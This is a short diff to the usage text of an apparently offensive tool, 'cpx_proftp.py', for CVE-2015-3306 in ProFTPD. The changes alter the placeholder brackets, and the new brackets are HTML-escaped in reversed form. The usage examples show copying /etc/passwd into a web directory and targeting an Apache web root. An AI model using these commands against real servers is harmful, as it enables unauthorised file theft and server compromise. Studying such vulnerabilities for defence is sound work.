@@ -5,7 +5,7 @@ Tool for exploit CVE-2015-3306
 METHOD 1:
 --------
 usage: 
-  python cpx_proftp.py 1 <IP> <REMOTE_FULLPATH_SRC_FILE> <REMOTE_FULLPATH_DST_FILE>
+  python cpx_proftp.py 1 &gt;IP&lt; &gt;REMOTE_FULLPATH_SRC_FILE&lt; &gt;REMOTE_FULLPATH_DST_FILE&lt;
 
 ex:
   python cpx_proftp.py 1 127.0.0.1 /etc/passwd /var/www/pass.txt
@@ -17,7 +17,7 @@ METHOD 2:
 --------
 
 usage: 
-  python cpx_proftp.py 2 <IP> <REMOTE_FULLPATH_APACHE2>
+  python cpx_proftp.py 2 &gt;IP&lt; &gt;REMOTE_FULLPATH_APACHE2&lt;
 
 ex:
   python cpx_proftp.py 2 127.0.0.1 /var/www/html
